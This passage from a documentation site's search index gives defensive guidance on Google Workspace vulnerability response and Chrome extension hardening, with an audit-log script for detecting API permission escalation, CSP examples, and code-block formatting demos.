protection\n</code></pre></p> </li> </ol>"},{"location":"vulnerability-management/#4-api-and-service-integration-vulnerabilities","title":"4. API and Service Integration Vulnerabilities","text":"<p>Scenario: API Permission Escalation Flaw</p> <p>Description: A vulnerability in Google's API framework that could allow escalated permissions or unauthorized access to resources.</p> <p>Impact Assessment: - Potential unauthorized API access - Cross-service permission escalation - Data access beyond authorized scopes - Persistent access via service accounts</p> <p>Response Actions: 1. Immediate Assessment <pre><code>Admin Console &gt; Reports &gt; Audit &gt; API\n- Review API usage patterns\n- Check for unusual access requests\n- Identify potentially affected services\n</code></pre></p> <ol> <li> <p>Interim Mitigations <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Domain-wide delegation\n- Restrict affected API scopes\n- Implement stricter service account controls\n- Revoke potentially compromised access tokens\n- Deploy enhanced API monitoring\n</code></pre></p> </li> <li> <p>Enhanced Detection <pre><code># Python script to detect API permission escalation\ndef detect_api_permission_escalation(reports_service):\n    \"\"\"Detect potential API permission escalation\"\"\"\n    # Get API access events\n    api_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='token,admin',\n        eventName='GRANT_ADMIN_PRIVILEGE,ADD_PRIVILEGE,TOKEN_ISSUES',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_activities = []\n    \n    for event in api_events.get('items', []):\n        # Extract event details\n        event_name = event.get('events', [{}])[0].get('name')\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        \n        # Different analysis based on event type\n        if event_name == 'GRANT_ADMIN_PRIVILEGE':\n            privilege_name = next((p.get('value') for p in parameters \n                                  if p.get('name') == 'privilege_name'), None)\n            \n            if is_sensitive_admin_privilege(privilege_name):\n                suspicious_activities.append({\n                    'user': event['actor']['email'],\n                    'activity': 'admin_privilege_grant',\n                    'privilege': privilege_name,\n                    'ip_address': event.get('ipAddress'),\n                    'timestamp': event.get('id', {}).get('time')\n                })\n                \n        elif event_name == 'ADD_PRIVILEGE':\n            scope = next((p.get('value') for p in parameters \n                         if p.get('name') == 'scope'), None)\n            \n            if is_sensitive_api_scope(scope):\n                suspicious_activities.append({\n                    'user': event['actor']['email'],\n                    'activity': 'api_privilege_addition',\n                    'scope': scope,\n                    'ip_address': event.get('ipAddress'),\n                    'timestamp': event.get('id', {}).get('time')\n                })\n                \n        elif event_name == 'TOKEN_ISSUES':\n            client_id = next((p.get('value') for p in parameters \n                            if p.get('name') == 'client_id'), None)\n            scopes = next((p.get('value') for p in parameters \n                         if p.get('name') == 'scope'), '').split()\n            \n            # Check for sensitive scope combinations\n            if has_dangerous_scope_combination(scopes):\n                suspicious_activities.append({\n                    'user': event['actor']['email'],\n                    'activity': 'dangerous_token_issuance',\n                    'client_id': client_id,\n                    'scopes': scopes,\n                    'ip_address': event.get('ipAddress'),\n                    'timestamp': event.get('id', {}).get('time')\n                })\n    \n    return suspicious_activities\n    \ndef is_sensitive_admin_privilege(privilege):\n    \"\"\"Check if admin privilege is particularly sensitive\"\"\"\n    sensitive_privileges = [\n        'ADMIN_SECURITY',\n        'ADMIN_DIRECTORY_USER',\n        'ADMIN_DIRECTORY_GROUP',\n        'ADMIN_SERVICE',\n        'ADMIN_DOMAIN'\n    ]\n    \n    return privilege in sensitive_privileges\n    \ndef is_sensitive_api_scope(scope):\n    \"\"\"Check if API scope is particularly sensitive\"\"\"\n    sensitive_scopes = [\n        'https://www.googleapis.com/auth/admin',\n        'https://www.googleapis.com/auth/cloud-platform',\n        'https://mail.google.com/',\n        'https://www.googleapis.com/auth/drive'\n    ]\n    \n    return any(scope.startswith(s) for s in sensitive_scopes)\n    \ndef has_dangerous_scope_combination(scopes):\n    \"\"\"Check for potentially dangerous combinations of scopes\"\"\"\n    # Check for admin + data access combinations\n    has_admin = any('admin' in s.lower() for s in scopes)\n    has_data_access = any(s.startswith('https://mail.google.com/') or \n                          s.startswith('https://www.googleapis.com/auth/drive') \n                          for s in scopes)\n    \n    return has_admin and has_data_access\n</code></pre></p> </li> <li> <p>Long-term Risk Reduction <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; API controls\n- Implement VPC Service Controls\n- Configure access boundaries\n- Deploy comprehensive API monitoring\n- Implement least privilege for service accounts\n</code></pre></p> </li> </ol>"},{"location":"vulnerability-management/#annual-vulnerability-assessment-framework","title":"Annual Vulnerability Assessment Framework","text":"<p>Develop a structured approach for comprehensive vulnerability assessment:</p> <ol> <li>Assessment Scope and Methodology</li> <li>Define assessment boundaries</li> <li>Establish testing methodologies</li> <li>Identify key security controls</li> <li> <p>Document exception processes</p> </li> <li> <p>Workspace Configuration Assessment</p> </li> <li>Review security settings</li> <li>Validate configuration against best practices</li> <li>Assess service-specific security controls</li> <li> <p>Evaluate cross-service security dependencies</p> </li> <li> <p>Service-Specific Assessment Areas</p> </li> <li> <p>Identity and Access Management</p> <ul> <li>Authentication settings</li> <li>MFA implementation</li> <li>Admin role configuration</li> <li>Privileged access management</li> </ul> </li> <li> <p>Gmail Security</p> <ul> <li>Phishing and malware protection</li> <li>Attachment security</li> <li>Email authentication</li> <li>Content compliance rules</li> </ul> </li> <li> <p>Drive and Document Security</p> <ul> <li>Sharing settings</li> <li>DLP implementation</li> <li>External collaboration controls</li> <li>Classification-based security</li> </ul> </li> <li> <p>Meet and Chat Security</p> <ul> <li>Access controls</li> <li>External participant management</li> <li>Recording and retention settings</li> <li>Data protection measures</li> </ul> </li> <li> <p>Vulnerability Documentation and Remediation</p> </li> <li>Standardized reporting format</li> <li>Severity classification</li> <li>Remediation workflow</li> <li> <p>Verification process</p> </li> <li> <p>Continuous Improvement</p> </li> <li>Assessment methodology refinement</li> <li>Control validation enhancement</li> <li>Testing automation</li> <li>Knowledge base development</li> </ol>"},{"location":"vulnerability-management/#integration-with-broader-security-programs","title":"Integration with Broader Security Programs","text":"<p>Connect vulnerability management with other security disciplines:</p> <ol> <li>Threat Intelligence Integration</li> <li>Incorporate Google-specific threat feeds</li> <li>Align vulnerability prioritization with threats</li> <li>Develop intelligence-driven assessments</li> <li> <p>Create targeted monitoring for emerging threats</p> </li> <li> <p>Incident Response Alignment</p> </li> <li>Develop vulnerability-specific playbooks</li> <li>Establish escalation procedures</li> <li>Create joint response processes</li> <li> <p>Implement lessons learned feedback loop</p> </li> <li> <p>Security Awareness Connection</p> </li> <li>Develop vulnerability-specific training</li> <li>Create user awareness materials</li> <li>Implement secure behavior guidance</li> <li> <p>Train for vulnerability reporting</p> </li> <li> <p>Cloud Security Integration</p> </li> <li>Align with broader cloud security strategy</li> <li>Implement consistent vulnerability management</li> <li>Develop cross-cloud assessment methodology</li> <li>Create unified reporting structure</li> </ol>"},{"location":"vulnerability-management/#resources-and-references","title":"Resources and References","text":"<ol> <li>Google Documentation</li> <li>Google Workspace Security Best Practices</li> <li>Google Workspace Security Whitepaper</li> <li> <p>Google Security Release Notes</p> </li> <li> <p>Industry Standards</p> </li> <li>NIST SP 800-40: Guide to Enterprise Patch Management</li> <li>CIS Google Workspace Benchmark</li> <li> <p>SANS: Vulnerability Management Maturity Model</p> </li> <li> <p>Vulnerability Databases</p> </li> <li>NIST National Vulnerability Database</li> <li>CISA Known Exploited Vulnerabilities Catalog</li> <li>Google Application Security</li> </ol> <p>Note: This framework should be adapted to your organization's specific Google Workspace configuration, security posture, and compliance requirements.</p>"},{"location":"chrome/","title":"Google Chrome & Browser Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"chrome/#overview","title":"\ud83d\udee1\ufe0f Overview","text":"<p>This section provides security professionals, IT administrators, and security teams with detailed strategies for securing Google Chrome and browser-based applications in enterprise environments. It focuses on browser hardening, extension management, policy configuration, and threat protection.</p> \ud83d\udd12 Browser Hardening <p>Secure configuration of Chrome browsers across organizational devices</p> \ud83d\udee1\ufe0f Extension Security <p>Managing and securing Chrome extensions in corporate environments</p> \ud83d\udd0d Web Security <p>Protecting users from web-based threats and securing web applications</p>"},{"location":"chrome/#about-chrome-security","title":"\ud83d\udd0d About Chrome Security","text":"<p>Web browsers are one of the most common attack vectors in modern enterprises. Securing Google Chrome is critical to protecting users and organizational data from web-based threats.</p>"},{"location":"chrome/#key-security-considerations","title":"Key Security Considerations","text":"<ul> <li>Browser Configuration: Implementing secure default settings across the organization</li> <li>Extension Management: Controlling which extensions can be installed</li> <li>Policy Management: Deploying and managing Chrome policies</li> <li>Certificate Handling: Managing trusted certificates and HTTPS enforcement</li> <li>Privacy Controls: Balancing user privacy with security monitoring</li> <li>Safe Browsing: Enabling and configuring advanced protection</li> <li>Update Management: Ensuring browsers are regularly updated</li> <li>Integration: Connecting Chrome with other security tools</li> </ul>"},{"location":"chrome/#getting-started","title":"Getting Started","text":"<p>This section is organized into several key areas of Chrome security:</p> <ol> <li>Chrome Enterprise: Managing Chrome in business environments</li> <li>Policy Configuration: Implementing secure Chrome policies</li> <li>Extension Security: Managing and securing browser extensions</li> <li>Web Filtering: Protecting users from malicious websites</li> <li>Authentication &amp; SSO: Implementing secure sign-in for browser access</li> <li>Zero Trust Browsing: Implementing modern browser security models</li> <li>Mobile Browser Security: Securing Chrome on mobile devices</li> <li>Chrome OS Security: Securing Chromebooks and Chrome OS devices</li> </ol> <p>Use the navigation menu to explore specific topics. Each section provides detailed guidance, implementation steps, and security best practices for Google Chrome security.</p> <p>This guide is continually updated as Google Chrome security capabilities evolve.</p>"},{"location":"chrome/authentication/","title":"Authentication &amp; SSO with Chrome","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on authentication and SSO with Chrome.</p>"},{"location":"chrome/authentication/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on authentication with Chrome including:</p> <ul> <li>SAML integration</li> <li>Google Account sign-in</li> <li>Password management</li> <li>Certificate-based authentication</li> <li>Multi-factor authentication</li> <li>Enterprise single sign-on</li> </ul>"},{"location":"chrome/authentication/#coming-soon","title":"Coming Soon","text":"<ul> <li>Configuring Chrome for SSO</li> <li>Implementing secure password policies</li> <li>Certificate deployment and management</li> <li>MFA strategies for Chrome users</li> <li>Preventing password reuse and credential theft</li> <li>Session management and timeout controls</li> </ul>"},{"location":"chrome/chrome-enterprise/","title":"Chrome Enterprise","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on Chrome Enterprise security.</p>"},{"location":"chrome/chrome-enterprise/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on Chrome Enterprise security including:</p> <ul> <li>Chrome Enterprise overview</li> <li>Chrome browser management</li> <li>Chrome OS management</li> <li>Deployment strategies</li> <li>Integration with Google Workspace</li> </ul>"},{"location":"chrome/chrome-enterprise/#coming-soon","title":"Coming Soon","text":"<ul> <li>Setting up Chrome Browser Cloud Management</li> <li>Configuring Chrome Enterprise Premium</li> <li>Chrome browser deployment best practices</li> <li>Security baseline configurations</li> <li>Browser update management</li> <li>Integration with existing enterprise security tools</li> </ul>"},{"location":"chrome/extension-security/","title":"Extension Security","text":""},{"location":"chrome/extension-security/#1-using-strict-content-security-policies","title":"1. Using Strict Content Security Policies.","text":"<p>Writing stricter Content Security Policies (CSPs) for Google Chrome Extensions helps enhance security by preventing Cross-Site Scripting (XSS) and other code injection attacks. Stricter CSP's limits the sources from which the content can be loaded.</p> <ul> <li> <p>Chrome Extensions run in privileged contexts. A compromised extension can:</p> </li> <li> <p>Access sensitive browser APIs.</p> </li> <li> <p>Steal user data.</p> </li> <li> <p>Execute arbitrary code.</p> </li> </ul> <p>For MV3, the default CSP is:</p> <pre><code>  \"content_security_policy\": {\n  \"extension_pages\": \"script-src 'self'; object-src 'self'\"\n  }\n</code></pre> <p>This is stricter than MV2 (which often allowed unsafe-eval) but can still be tightened further.</p> <ul> <li> <p>Ways to tigthen CSPs:</p> <ol> <li> <p>Disallow Inline Scripts</p> </li> <li> <p>Restrict img-src, media-src, and others</p> </li> </ol> <p>\"content_security_policy\": {   \"extension_pages\": \"default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; object-src 'none';\"   }   Explanation:</p> <p>default-src 'none': blocks all by default</p> <p>cript-src 'self': only allow internal JS</p> <p>connect-src 'self': allow fetch/XHR to self</p> <p>img-src 'self': only internal images</p> <p>style-src 'self': disallow inline styles and external stylesheets</p> <p>object-src 'none': completely block plugins</p> </li> </ul>"},{"location":"chrome/extension-security/#2-minimizing-permissions","title":"2. Minimizing Permissions","text":"<p>Minimizing permissions in a Google Chrome extension is crucial for security because of the privileged access that extensions can have to a user's browser and data.</p> <ol> <li>Reducing Attack Surface:<ul> <li>Every permission that is granted is a potential entry point for an attacker.</li> <li>Fewer permissions means less ways for bad actors to exploit the extension.</li> </ul> </li> </ol> <p>2.Preventing Privelege Escalation:     In a compromised extension, excessive permissions can let the attacker:       * Access sensitive data (emails, cookies, bookmarks)      * Control browser actions      * Manipulate web requests      * Restricting permissions helps contain damage.</p> <ol> <li>Easier Maintenance and Auditing      With fewer permissions:<ul> <li>Code reviews are simpler</li> <li>Security audits are faster</li> <li>It's easier to reason about what the extension is allowed to do<pre><code> Best Practices:                                 |   Why it helps:\n Use host_permissions selectively            |   Don\u2019t request &lt;all_urls&gt; unless necessary. Use specific domains.\n Use optional permissions (optional_permissions) |   Only request permissions when needed, and ask at runtime.\n Avoid persistent background scripts if possible |   Use service workers (Manifest V3) to reduce runtime exposure.\n Use declarative APIs (declarativeNetRequest)    |   Safer than webRequest, which can expose full request/response data.\n Audit permissions regularly                     |   Refactor or remove unnecessary permissions as features change.\n</code></pre> </li> </ul> </li> </ol>"},{"location":"chrome/extension-security/#3-regular-updates-and-monitoring","title":"3. Regular Updates and Monitoring","text":"<p>For depveloperes it is very important to patch any newly found vulnerabilities promptly.</p> <ol> <li> <p>Monitor security advisories (e.g., Chromium Blog, CVE databases) for:</p> <pre><code> * JavaScript vulnerabilities\n * Extension API changes\n * Third-party library issues\n\n Fix identified issues immediately!\n</code></pre> <p>2.Updating Manifest and Dependencies:</p> <pre><code> * Ensure you're using the latest stable Manifest version (Manifest V3 is currently required).\n * Reghularly udpate and audit third-party libraries\n\n   You can use tools like \"npm audit\" or \"Snyk\"\n</code></pre> <p>3.Use Semantic Versioning:</p> <pre><code> * What is Semantic Versioning?\n\n Semantic Versioning (SemVer) is a structured way to version software using a three-part number:\n\n    MAJOR.MINOR.PATCH \n For Example:\n\n    1.4.2\n\n Each segment conveys meaning about the update's impact:\n\n | Segment   | When to Increment         | Description                                                              |\n | --------- | ------------------------- | ------------------------------------------------------------------------ |\n | **MAJOR** | Breaking changes          | Incompatible API or behavior changes                                     |\n | **MINOR** | New features              | Backward-compatible feature additions                                    |\n | **PATCH** | Bug fixes / small changes | Backward-compatible fixes, performance improvements, or security patches |\n\n * The use of SemVer in Extensions:\n\n    * Helps users know what kind of changes to expect.\n    * Makes it easier for Google reviewers to track meaningful updates.\n\n * Helps Security Patch management:\n\n    * Clear PATCH version increases make it easier to distinguish security updates from new features.\n\n * Aids in Automation:\n\n    * Automated deployment tools and CI/CD pipelines can detect when to trigger updates based on version increments.\n</code></pre> <p>How to Apply Semantic Versioning in Your Extension?:</p> <pre><code> 1. Update manifest.json version\n\n          \"version\": \"2.3.1\"\n\n    This is required by Chrome and is the official version used for auto-updates.\n\n 2. Match It with CHANGELOG.md\n\n          ## [2.3.1] - 2025-05-30\n          ### Fixed\n          - Patched a bug that caused login tokens to persist incorrectly.\n          - Fixed performance issue in background script.\n\n          ## [2.3.0] - 2025-05-25\n          ### Added\n          - New feature: Ability to export settings as JSON.\n\n          ## [2.0.0] - 2025-05-01\n          ### Changed\n          - Switched from Manifest V2 to V3. This is a breaking change.\n          - Dropped support for Chrome &lt; 90.\n\n Make sure the logs are structure consistently.\n\n 3. Version Bumping Strategy\n\n       | Situation                               | New Version      | Why                             |\n       | --------------------------------------- | ---------------- | ------------------------------- |\n       | You fix a bug in a stable release       | `1.2.3 \u2192 1.2.4`  | PATCH update                    |\n       | You add a feature (e.g., dark mode)     | `1.2.3 \u2192 1.3.0`  | MINOR update                    |\n       | You migrate to Manifest V3              | `1.2.3 \u2192 2.0.0`  | MAJOR update                    |\n       | You fix a security vulnerability        | `1.3.2 \u2192 1.3.3`  | PATCH update (critical)         |\n       | You refactor internal code (no changes) | *No bump needed* | Optional, if behavior unchanged |\n\n 4. Security Best Practices Using SemVer:\n\n       | Action                           | Benefit                               |\n       | -------------------------------- | ------------------------------------- |\n       | Use PATCH for all security fixes | Easier to isolate and track in audits |\n       | Avoid skipping MAJOR bumps       | Prevent breaking user experience      |\n       | Communicate changes clearly      | Reduces user confusion/trust issues   |\n       | Document deprecated features     | Helps manage risky transitions        |\n\n 5. Automation Tools for SemVer5:\n\n       | Tool                  | Use Case                      |\n       | --------------------- | ----------------------------- |\n       | **standard-version**  | Auto-bump version + changelog |\n       | **semantic-release**  | Full CI-based release mgmt    |\n       | **npm version patch** | Quick version bump            |\n</code></pre> </li> </ol>"},{"location":"chrome/extension-security/#4-monitoring-code-setup","title":"4. Monitoring \u2013 Code &amp; Setup","text":"<ol> <li> <p>Capture and Report Errors:</p> <p>background.js</p> <pre><code>       self.onerror = function (message, source, lineno, colno, error) {\n         fetch(\"https://your-logging-endpoint.com/log\", {\n           method: \"POST\",\n           headers: {\n             \"Content-Type\": \"application/json\"\n           },\n           body: JSON.stringify({\n             message,\n             source,\n             lineno,\n             colno,\n             stack: error ? error.stack : null\n           })\n         });\n       };\n</code></pre> <p>This logs any uncaught errors in your background service worker.</p> <ol> <li> <p>Log User Behavior (non-sensitive):</p> <p>Example: Track Feature Usage:</p> <pre><code>       function logFeatureUsage(featureName) {\n        fetch(\"https://your-logging-endpoint.com/feature-usage\", {\n          method: \"POST\",\n          body: JSON.stringify({ feature: featureName, time: Date.now() })\n        });\n      }\n\n      // Usage\n      logFeatureUsage(\"clicked_sync_button\");\n</code></pre> <p>Ensure you're not collecting PII (Personally Identifiable Information) without explicit user consent.</p> </li> <li> <p>Monitor for Malicious Behavior (e.g., Extension Hijack):</p> <p>Detect unexpected API usage or content injection:</p> <pre><code>      chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) =&gt; {\n        if (changeInfo.status === 'complete') {\n          chrome.scripting.executeScript({\n            target: { tabId: tabId },\n            func: () =&gt; {\n              if (document.querySelector('iframe[src*=\"malicious-site.com\"]')) {\n                alert('Suspicious iframe detected.');\n              }\n            }\n          });\n        }\n      });\n</code></pre> <ol> <li> <p>Security Checklist (Code-Focused):</p> Task Code Reference Use Manifest V3 <code>manifest.json</code> Remove inline scripts Move to external <code>.js</code> Enforce CSP <code>\"content_security_policy\"</code> Log errors securely <code>fetch</code> error handler Sanitize inputs <code>sanitizeInput()</code> Test core logic Jest/Mocha unit tests CI/CD pipeline GitHub Actions YAML Patch dependencies <code>npm audit fix</code> </li> </ol> </li> </ol> </li> </ol>"},{"location":"chrome/extension-security/#5-validate-and-sanitize-input","title":"5. Validate and Sanitize Input","text":"<ol> <li>Why Input Sanitization &amp; Validation Matter?</li> </ol> <p>Chrome extensions often:</p> <ul> <li>Accept user input (e.g., popup forms, options pages)</li> <li>Inject content scripts into webpages</li> <li>Make API calls and handle responses</li> </ul> <p>Without sanitization/validation:</p> <ul> <li>A user could inject"},{"location":"chrome/policy-config/","title":"Chrome Policy Configuration","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on Chrome policy configuration.</p>"},{"location":"chrome/policy-config/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on Chrome policy configuration including:</p> <ul> <li>Policy configuration methods</li> <li>Security-focused policies</li> <li>Group Policy vs Chrome Browser Cloud Management</li> <li>Policy templates and examples</li> <li>Testing and validation</li> </ul>"},{"location":"chrome/policy-config/#coming-soon","title":"Coming Soon","text":"<ul> <li>Essential security policies for Chrome</li> <li>Configuring password and authentication policies</li> <li>Managing certificate and HTTPS requirements</li> <li>Extension management policies</li> <li>Content filtering and Safe Browsing policies</li> <li>Chrome OS specific policies</li> </ul>"},{"location":"chrome/web-filtering/","title":"Web Filtering with Chrome","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on web filtering with Chrome.</p>"},{"location":"chrome/web-filtering/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on web filtering capabilities in Chrome including:</p> <ul> <li>Safe Browsing configurations</li> <li>URL filtering approaches</li> <li>DNS-based filtering integration</li> <li>Content category blocking</li> <li>Custom block pages</li> <li>Security reporting</li> </ul>"},{"location":"chrome/web-filtering/#coming-soon","title":"Coming Soon","text":"<ul> <li>Configuring Enhanced Safe Browsing</li> <li>Implementing allowlists and blocklists</li> <li>Integrating with secure web gateways</li> <li>DNS-based security controls</li> <li>Monitoring and reporting on web access</li> <li>User education and override mechanisms</li> </ul>"},{"location":"chrome/zero-trust/","title":"Zero Trust Browsing","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on Zero Trust browsing with Chrome.</p>"},{"location":"chrome/zero-trust/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on implementing Zero Trust browser security including:</p> <ul> <li>Zero Trust principles for browsers</li> <li>Chrome's role in Zero Trust architecture</li> <li>BeyondCorp integration</li> <li>Identity-aware access controls</li> <li>Browser isolation approaches</li> <li>Continuous verification</li> </ul>"},{"location":"chrome/zero-trust/#coming-soon","title":"Coming Soon","text":"<ul> <li>Implementing Chrome as a Zero Trust endpoint</li> <li>BeyondCorp Enterprise configuration</li> <li>Chrome and Identity-Aware Proxy (IAP)</li> <li>Browser isolation strategies</li> <li>Chrome Enterprise security reporting</li> <li>Cloud-based vs. on-premises Zero Trust implementation</li> </ul>"},{"location":"contributing/code-blocks/","title":"Code Block Features","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"contributing/code-blocks/#code-block-features","title":"Code Block Features","text":"<p>This guide demonstrates the advanced code block features available in the documentation, including syntax highlighting, line numbers, line highlighting, annotations, and the new line selection feature.</p>"},{"location":"contributing/code-blocks/#basic-code-block","title":"Basic Code Block","text":"<p>A simple code block with syntax highlighting:</p> <pre><code>def hello_world():\n    \"\"\"A simple function that prints Hello World.\"\"\"\n    message = \"Hello World\"\n    print(message)\n    \n    # This is a comment\n    for i in range(5):\n        print(f\"Count: {i}\")\n    \n    return True\n</code></pre>"},{"location":"contributing/code-blocks/#code-block-with-line-numbers","title":"Code Block with Line Numbers","text":"<p>Adding line numbers makes it easier to reference specific parts of code:</p> <pre><code>def hello_world():\n    \"\"\"A simple function that prints Hello World.\"\"\"\n    message = \"Hello World\"\n    print(message)\n    \n    # This is a comment\n    for i in range(5):\n        print(f\"Count: {i}\")\n    \n    return True\n</code></pre>"},{"location":"contributing/code-blocks/#code-block-with-line-highlighting","title":"Code Block with Line Highlighting","text":"<p>You can highlight specific lines to draw attention to them:</p> <pre><code>def hello_world():\n    \"\"\"A simple function that prints Hello World.\"\"\"\n    message = \"Hello World\"  # This line is highlighted\n    print(message)\n    \n    # This comment and the next two lines are highlighted\n    for i in range(5):\n        print(f\"Count: {i}\")\n    \n    return True\n</code></pre>"},{"location":"contributing/code-blocks/#code-block-with-title","title":"Code Block with Title","text":"<p>You can add a title to your code block:</p> hello_world.py<pre><code>def hello_world():\n    \"\"\"A simple function that prints Hello World.\"\"\"\n    message = \"Hello World\"\n    print(message)\n    \n    # This is a comment\n    for i in range(5):\n        print(f\"Count: {i}\")\n    \n    return True\n</code></pre>"},{"location":"contributing/code-blocks/#code-block-with-annotations","title":"Code Block with Annotations","text":"<p>You can add annotations to explain specific parts of your code:</p> hello_world.py<pre><code>def hello_world():\n    \"\"\"A simple function that prints Hello World.\"\"\"\n    message = \"Hello World\"\n    print(message)  # (1)\n    \n    # This is a comment\n    for i in range(5):\n        print(f\"Count: {i}\")  # (2)\n    \n    return True  # (3)\n</code></pre> <ol> <li>This line prints the message to the console</li> <li>This loop iterates 5 times (0-4)</li> <li>The function returns a boolean value</li> </ol>"},{"location":"contributing/code-blocks/#code-line-selection-feature","title":"Code Line Selection Feature","text":"<p>The line selection feature allows you to select and share specific lines of code. Click on any line number to select that line. You'll see a \"Select lines\" button appear that allows you to copy a link to the selected line(s).</p> secure_configuration.py<pre><code>def apply_security_controls(workspace_domain, config):\n    \"\"\"Apply security controls to Google Workspace domain.\"\"\"\n    # Initialize the admin SDK\n    admin_service = initialize_admin_sdk(config['credentials_file'])\n    \n    # Apply 2-Step Verification settings\n    if config['enforce_2sv']:\n        enforce_2sv_for_all_users(admin_service, workspace_domain)\n    \n    # Configure password policy\n    set_password_policy(\n        admin_service, \n        workspace_domain,\n        min_length=config['password_min_length'],\n        require_uppercase=config['password_require_uppercase'],\n        require_lowercase=config['password_require_lowercase'],\n        require_special_char=config['password_require_special_char']\n    )\n    \n    # Configure login monitoring\n    if config['enable_login_monitoring']:\n        setup_login_monitoring(\n            admin_service,\n            workspace_domain,\n            alert_email=config['security_alert_email']\n        )\n    \n    # Apply data access controls\n    configure_data_access_controls(\n        admin_service,\n        workspace_domain,\n        dlp_rules=config['dlp_rules']\n    )\n    \n    # Return success status\n    return {\n        \"status\": \"success\",\n        \"controls_applied\": list(config.keys()),\n        \"timestamp\": time.strftime(\"%Y-%m-%d %H:%M:%S\")\n    }\n</code></pre> <p>Try clicking on line numbers to select lines, then use the \"Select lines\" button to copy a link to the selected lines.</p>"},{"location":"contributing/code-blocks/#javascript-example-with-line-selection","title":"JavaScript Example with Line Selection","text":"<p>Here's a JavaScript example where you can also select lines:</p> security-controls.js<pre><code>/**\n * Applies security controls to a Google Workspace domain\n * @param {string} domain - The Google Workspace domain\n * @param {Object} config - Configuration options\n * @returns {Promise&lt;Object&gt;} - Result of the operation\n */\nasync function applySecurityControls(domain, config) {\n  try {\n    // Initialize the Admin SDK\n    const adminClient = await initializeAdminSDK(config.credentialsFile);\n    \n    // Apply 2-Step Verification if configured\n    if (config.enforce2SV) {\n      await enforce2SVForAllUsers(adminClient, domain);\n      console.log('2SV enforcement applied successfully');\n    }\n    \n    // Configure password policies\n    const passwordPolicy = {\n      minLength: config.passwordMinLength || 12,\n      requireUppercase: config.passwordRequireUppercase || true,\n      requireLowercase: config.passwordRequireLowercase || true,\n      requireSpecialChar: config.passwordRequireSpecialChar || true,\n      requireNumber: config.passwordRequireNumber || true\n    };\n    \n    await setPasswordPolicy(adminClient, domain, passwordPolicy);\n    console.log('Password policy configured successfully');\n    \n    // Set up security alerts\n    if (config.enableAlerts) {\n      await setupSecurityAlerts(adminClient, domain, {\n        alertEmail: config.securityAlertEmail,\n        alertLevel: config.alertLevel || 'HIGH'\n      });\n      console.log('Security alerts configured successfully');\n    }\n    \n    // Return success status\n    return {\n      status: 'success',\n      controlsApplied: Object.keys(config),\n      timestamp: new Date().toISOString()\n    };\n  } catch (error) {\n    console.error('Error applying security controls:', error);\n    return {\n      status: 'error',\n      message: error.message,\n      timestamp: new Date().toISOString()\n    };\n  }\n}\n</code></pre>"},{"location":"contributing/code-blocks/#diff-syntax-highlighting-with-line-selection","title":"Diff Syntax Highlighting with Line Selection","text":"<p>You can also select lines in diff syntax highlighting:</p> <pre><code> # Original password policy settings\n password_policy = {\n-    \"min_length\": 8,\n+    \"min_length\": 12,\n     \"require_uppercase\": True,\n-    \"require_special_char\": False,\n+    \"require_special_char\": True,\n+    \"enforce_password_expiration\": True,\n+    \"password_expiration_days\": 90,\n     \"prevent_password_reuse\": True,\n-    \"reuse_history_size\": 5\n+    \"reuse_history_size\": 10\n }\n \n # Security alert settings\n alert_settings = {\n     \"enable_alerts\": True,\n-    \"alert_email\": \"it@example.com\",\n+    \"alert_email\": \"security@example.com\",\n+    \"alert_mobile\": \"+1234567890\",\n     \"alert_severity_threshold\": \"MEDIUM\"\n }\n</code></pre>"},{"location":"contributing/code-blocks/#how-to-use-line-selection-in-your-documentation","title":"How to Use Line Selection in Your Documentation","text":"<p>To enable code line selection in your code blocks, use the <code>linenums=\"1\"</code> attribute to enable line numbers. The line selection feature is automatically available for all code blocks with line numbers.</p> <p>When users click on a line number, the \"Select lines\" button appears, allowing them to copy a link that directly highlights those specific lines when shared.</p> <p>This feature is particularly useful for:</p> <ol> <li>Referencing specific parts of code during discussions</li> <li>Creating targeted documentation links</li> <li>Sharing specific implementation details</li> <li>Highlighting important security controls</li> </ol> <p>After selecting lines, users can copy the URL which contains a fragment identifier that will highlight those lines when the page is loaded.</p>"},{"location":"contributing/documentation-guidelines/","title":"Documentation Guidelines","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"contributing/documentation-guidelines/#documentation-guidelines","title":"Documentation Guidelines","text":"<p>This page provides guidelines for writing and formatting documentation for the Google Security Suite. Following these guidelines ensures consistency across the documentation and makes it easier for users to navigate and understand the content.</p>"},{"location":"contributing/documentation-guidelines/#general-writing-guidelines","title":"General Writing Guidelines","text":"<ul> <li>Be concise: Use simple, clear language and avoid unnecessary words.</li> <li>Use active voice: Active voice is more direct and easier to read (e.g., \"Enable MFA\" instead of \"MFA should be enabled\").</li> <li>Focus on the user: Write from the user's perspective, addressing their needs and questions.</li> <li>Provide context: Explain why a security control is important before explaining how to implement it.</li> <li>Include examples: Practical examples help users understand and apply concepts.</li> <li>Link related content: Reference related topics to help users navigate the documentation.</li> </ul>"},{"location":"contributing/documentation-guidelines/#document-structure","title":"Document Structure","text":"<p>Each documentation page should follow this general structure:</p> <ol> <li>Title: Clear, descriptive title that accurately reflects the content</li> <li>Introduction: Brief overview of what the page covers</li> <li>Prerequisites (if applicable): What users need before implementing this content</li> <li>Main Content: Organized into logical sections with clear headings</li> <li>Examples: Practical examples of implementation</li> <li>Troubleshooting (if applicable): Common issues and solutions</li> <li>Next Steps: What to do after implementing this content</li> <li>References: Links to additional resources</li> 